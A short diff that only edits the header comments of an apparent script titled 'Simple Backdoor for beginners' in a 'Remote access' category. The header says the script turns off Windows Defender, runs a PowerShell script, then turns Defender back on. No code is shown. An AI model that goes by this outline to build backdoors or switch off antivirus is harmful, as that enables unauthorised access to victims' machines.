@@ -1,9 +1,9 @@
 # Title:      
-# 			  Simple Backdoor for beginners
+* 			  Simple Backdoor for beginners
 # Description:      
-# 			  1) script deactivates Windows Defender
-# 			  2) script runs the powershell script
-# 			  3) script activates Windows Defender
+* 			  1) script deactivates Windows Defender
+* 			  2) script runs the powershell script
+* 			  3) script activates Windows Defender
 # Author:           RonjaMaja
 # Version:          1.0
 # Category:         Remote access
